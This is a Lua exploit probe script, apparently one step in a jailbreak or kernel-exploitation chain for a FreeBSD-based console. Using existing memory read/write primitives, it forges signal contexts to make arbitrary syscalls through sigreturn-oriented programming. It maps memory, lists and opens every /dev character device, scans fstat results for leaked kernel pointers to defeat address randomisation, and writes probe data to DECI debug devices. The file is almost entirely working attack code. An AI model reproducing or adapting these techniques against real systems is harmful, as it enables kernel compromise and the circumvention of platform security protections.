-- CRASH_CLASS: LOW
-- PROBE 137f: Full /dev listing + device rdev scan for kernel pointers
--
-- 137c found 30 entries in /dev. Get ALL entries, then open each
-- device and check st_rdev in fstat for kernel pointers.
-- Also try DECI write with O_NONBLOCK only.

print("=== PROBE 137f: DEVLIST + RDEV ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

--------------------------------------------------------------------
-- SECTION A: Full /dev listing
--------------------------------------------------------------------
print("")
print("--- [A] /dev listing ---")

local path_buf = gpu + 0x100
ws(path_buf, "/dev")
local fd_dev = srop(5, ua(path_buf), uint64(0x20000))
local devh, devl = get_hi_lo(fd_dev)

local all_devs = {}
if devl > 0 and devl < 256 and devh == 0 then
    local dir_buf = gpu + 0x800
    local basep = gpu + 0x7F80

    for pass = 1, 10 do
        zero(dir_buf, 0x2000)
        memory.write_qword(basep, uint64(0))
        local rv_gd = srop(196, uint64(devl), ua(dir_buf), uint64(0x2000), ua(basep))
        local gdh, gdl = get_hi_lo(rv_gd)
        if gdl == 0 or gdh ~= 0 then break end

        local offset = 0
        while offset < gdl do
            local fileno = to_num(memory.read_dword(dir_buf + offset))
            local w2 = to_num(memory.read_dword(dir_buf + offset + 4))
            local reclen = w2 % 65536
            local dtype = math.floor(w2 / 65536) % 256
            local namlen = math.floor(w2 / 16777216)
            if reclen == 0 then break end
            local name = ""
            for i = 0, math.min(namlen, 60) - 1 do
                local b = to_num(memory.read_byte(dir_buf + offset + 8 + i))
                if b >= 32 and b < 127 then name = name .. string.char(b) end
            end
            if #name > 0 and name ~= "." and name ~= ".." then
                table.insert(all_devs, {name=name, ino=fileno, type=dtype})
            end
            offset = offset + reclen
        end
    end
    srop(6, uint64(devl))
end
print("[A] found " .. #all_devs .. " devices")
for _, d in ipairs(all_devs) do
    print(string.format("[A] t=%d ino=%d %s", d.type, d.ino, d.name))
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: Open each non-deci device and check rdev
--------------------------------------------------------------------
print("")
print("--- [B] device rdev scan ---")

local stat_buf = gpu + 0x3000
for _, d in ipairs(all_devs) do
    -- Skip deci devices (already tested) and directories/symlinks
    if not d.name:match("^deci_") and d.type == 2 then  -- type 2 = character device
        ws(path_buf, "/dev/" .. d.name)
        local fd = srop(5, ua(path_buf), uint64(2))
        local fh, fl = get_hi_lo(fd)
        if fl == 0 or fl >= 256 or fh ~= 0 then
            fd = srop(5, ua(path_buf), uint64(0))
            fh, fl = get_hi_lo(fd)
        end
        if fl > 0 and fl < 256 and fh == 0 then
            zero(stat_buf, 0x80)
            srop(189, uint64(fl), ua(stat_buf))
            local st_dev = safe_rq(stat_buf)
            local st_rdev = safe_rq(stat_buf + 0x50)
            print(string.format("[B] %s fd=%d dev=%s rdev=%s",
                d.name, fl, hex(st_dev), hex(st_rdev)))

            -- Check for kernel pointers in full stat struct
            for off = 0, 0x78, 8 do
                local v = safe_rq(stat_buf + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print(string.format("  *** KPTR stat+0x%02X: %s ***", off, hex(v)))
                    end
                end
            end
            srop(6, uint64(fl))
        end
    end
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: Quick DECI write test (O_WRONLY|O_NONBLOCK)
--------------------------------------------------------------------
print("")
print("--- [C] DECI write ---")

ws(path_buf, "/dev/deci_stdout")
local fd_dout = srop(5, ua(path_buf), uint64(0x2005))  -- O_WRONLY|O_NONBLOCK|O_CLOEXEC
local doh, dol = get_hi_lo(fd_dout)
if dol > 0 and dol < 256 and doh == 0 then
    local wbuf = gpu + 0x3800
    ws(wbuf, "TEST\n")
    local rv_w = srop(4, uint64(dol), ua(wbuf), uint64(5))
    print("[C] deci_stdout write=" .. hex(rv_w))

    -- Write a larger buffer to see if it consumes data
    zero(wbuf, 0x100)
    for i = 0, 0xFF do memory.write_byte(wbuf + i, 0x41) end  -- 'A'*256
    rv_w = srop(4, uint64(dol), ua(wbuf), uint64(256))
    print("[C] deci_stdout write(256)=" .. hex(rv_w))
    srop(6, uint64(dol))
end

-- Try deci_ttya0 (might be a special debug channel)
ws(path_buf, "/dev/deci_ttya0")
local fd_ttya = srop(5, ua(path_buf), uint64(0x2005))
local tah, tal = get_hi_lo(fd_ttya)
if tal > 0 and tal < 256 and tah == 0 then
    local wbuf = gpu + 0x3800
    ws(wbuf, "DECI_CMD_VERSION\n")
    local rv_w = srop(4, uint64(tal), ua(wbuf), uint64(17))
    print("[C] deci_ttya0 write=" .. hex(rv_w))
    srop(6, uint64(tal))
end
print("[C] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
